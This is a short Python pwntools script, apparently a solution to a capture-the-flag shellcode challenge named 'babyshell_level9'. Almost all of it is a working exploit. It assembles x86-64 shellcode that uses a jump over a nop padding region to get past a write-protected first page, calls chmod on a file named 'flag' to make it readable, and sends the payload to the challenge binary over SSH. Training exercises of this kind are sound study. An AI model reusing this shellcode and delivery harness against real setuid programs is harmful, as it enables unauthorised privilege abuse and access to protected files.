#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'
context.timeout = 3000000

# 1 Stackframe is 8 bytes (64bit)

# That is the extra layer:
# puts("Removing write permissions from first 4096 bytes of shellcode.\n");
#    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);

shellcode=f"""
push 0x67616c66
push rsp
pop rdi
jmp meem
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
meem:
push 6
pop rsi
push SYS_chmod
pop rax
syscall
"""

print(shellcode)
shellcode=(asm(shellcode))

print('1', disasm(shellcode))

s = ssh(host="pwn")

shellcode=bytes(shellcode)
print("length", len(shellcode))

p = s.process(['/challenge/babyshell_level9'], cwd='/')
p.send(shellcode)
print(p.recvall().decode("UTF-8"))
